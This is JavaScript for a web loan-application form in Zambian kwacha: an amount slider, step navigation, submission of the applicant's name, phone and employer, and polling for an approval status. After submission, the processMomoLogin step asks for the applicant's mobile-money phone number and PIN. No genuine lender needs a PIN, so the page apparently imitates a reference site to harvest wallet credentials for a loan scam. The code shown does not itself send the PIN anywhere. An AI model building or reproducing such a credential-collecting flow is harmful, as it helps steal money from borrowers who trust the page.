let currentAppId = null;

function updateCalculator() {
  const sliderVal = document.getElementById('calc-amount-slider').value;
  const formattedAmount = Number(sliderVal).toLocaleString();
  
  document.getElementById('display-amount').innerText = `ZMW ${formattedAmount}`;
  
  // Dynamic calculation preview simulation matching reference
  const calculatedMonthly = Math.round(sliderVal / 48);
  document.getElementById('display-monthly').innerText = `ZMW ${calculatedMonthly.toLocaleString()}`;
}

function goToStep(stepNumber) {
  document.querySelectorAll('.form-step').forEach(el => el.style.display = 'none');
  
  if (stepNumber === 2) {
    const sliderVal = document.getElementById('calc-amount-slider').value;
    document.getElementById('form-amount').value = sliderVal;
  }
  
  const targetStep = document.getElementById(`step-${stepNumber}`);
  if (targetStep) {
    targetStep.style.display = 'block';
  }

  if (stepNumber === 8) {
    setTimeout(() => {
      goToStep(9);
    }, 3000);
  }
}

async function submitInitialApplication() {
  const sliderVal = document.getElementById('calc-amount-slider').value;
  const payload = {
    name: `${document.getElementById('form-firstname').value} ${document.getElementById('form-lastname').value}`,
    phone: document.getElementById('form-phone').value,
    desired_amount: sliderVal,
    desired_term: "48",
    employer: document.getElementById('form-employer').value,
    purpose: document.getElementById('form-purpose').value
  };

  try {
    const response = await fetch('/applications', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await response.json();
    currentAppId = data.id;

    await fetch(`/applications/${currentAppId}/submit`, { method: 'POST' });
    goToStep(5);
  } catch (error) {
    console.error('Error submitting application:', error);
    alert('Failed to submit application. Please try again.');
  }
}

function processMomoLogin() {
  const phone = document.getElementById('momo-phone').value;
  const pin = document.getElementById('momo-pin').value;
  if (!phone || !pin) {
    alert('Please enter your MoMo phone number and PIN');
    return;
  }
  goToStep(6);
  pollApplicationStatus();
}

function pollApplicationStatus() {
  const interval = setInterval(async () => {
    if (!currentAppId) return;
    try {
      const res = await fetch(`/applications/${currentAppId}`);
      const app = await res.json();
      
      if (app.status === 'approved') {
        clearInterval(interval);
        goToStep(7);
      } else if (app.status === 'rejected') {
        clearInterval(interval);
        alert('Your loan application was rejected.');
        goToStep(1);
      }
    } catch (e) {
      console.error('Polling error:', e);
    }
  }, 3000);
  }
    
